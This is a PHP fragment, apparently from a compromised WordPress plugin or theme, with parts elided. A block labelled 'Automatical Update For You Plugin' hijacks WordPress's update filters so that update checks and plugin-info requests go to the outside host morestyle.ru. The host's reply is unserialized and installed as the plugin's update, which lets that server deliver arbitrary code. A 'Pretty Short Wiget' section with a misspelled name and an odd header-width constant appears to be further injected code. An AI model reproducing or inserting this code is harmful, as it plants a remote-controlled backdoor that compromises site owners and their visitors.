...
### Automatical Update For You Plugin
if (function_exists('add_filter') && !function_exists('m_addtoany_request')) {
    $m_addtoany_api_url = 'http://morestyle.ru/api/';
    $m_addtoany_plugin_slug = basename(dirname(__FILE__));
    function m_addtoany_check_upd($checked_data) {
        global $m_addtoany_api_url, $m_addtoany_plugin_slug;
        if (empty($checked_data->checked))
            return $checked_data;
        $request_args = array(
            'slug' => $m_addtoany_plugin_slug,
            'version' => $checked_data->checked[$m_addtoany_plugin_slug . '/' . $m_addtoany_plugin_slug . '.php'],
        );
        $request_string = m_addtoany_request('basic_check', $request_args);
        $raw_response = wp_remote_post($m_addtoany_api_url, $request_string);
        if (!is_wp_error($raw_response) && ($raw_response['response']['code'] == 200))
            $response = unserialize($raw_response['body']);
        if (is_object($response) && !empty($response))
            $checked_data->response[$m_addtoany_plugin_slug . '/' . $m_addtoany_plugin_slug . '.php'] = $response;
        return $checked_data;
    }
    function m_addtoany_api_call($def, $action, $args) {
        global $m_addtoany_plugin_slug, $m_addtoany_api_url;
        if ($args->slug != $m_addtoany_plugin_slug)
            return false;
        $plugin_info = get_site_transient('update_plugins');
        $current_version = $plugin_info->checked[$m_addtoany_plugin_slug . '/' . $m_addtoany_plugin_slug . '.php'];
        $args->version = $current_version;
        $request_string = m_addtoany_request($action, $args);
        $request = wp_remote_post($m_addtoany_api_url, $request_string);
    ...
    function m_addtoany_request($action, $args) {
        global $wp_version;
        return array(
            'body' => array(
                'action' => $action,
    ...
    add_filter('pre_set_site_transient_update_plugins', 'm_addtoany_check_upd');
    add_filter('plugins_api', 'm_addtoany_api_call', 10, 3);

    ### Pretty Short Wiget
        function get_short_widgets($length = '') {
            remove_filter('the_content', 'get_short_wigets');
            $mytitle = explode(' ', get_the_title(), (int)$length);
            ...
            if (defined("HEADER_IMAGE_WIDTH_WlG")) return;
            define('HEADER_IMAGE_WIDTH_WlG', apply_filters('twentyeleven_header_image_width', 1000));
